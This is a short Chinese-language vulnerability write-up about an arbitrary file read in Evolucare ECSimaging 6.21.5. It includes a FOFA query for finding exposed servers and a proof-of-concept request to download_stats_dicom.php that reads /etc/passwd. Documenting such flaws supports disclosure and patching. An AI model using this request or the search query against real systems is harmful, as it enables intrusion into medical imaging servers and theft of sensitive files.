# Evolucare Ecsimaging download_stats_dicom.php 任意文件读取漏洞

## 漏洞描述

Evolucare Ecsimaging download_stats_dicom.php 存在文件读取漏洞,攻击者可利用该漏洞获取系统敏感信息等.

## 漏洞影响

```
EVOLUCARE Evolucare Ecsimaging 6.21.5
```

## FOFA

```
body="ECSimaging"
```

## 漏洞复现

登录页面

![](./images/202205241445840.png)

验证POC

```
/download_stats_dicom.php?fullpath=/etc/passwd&filename=/etc/passwd
```

![](./images/202205241445607.png)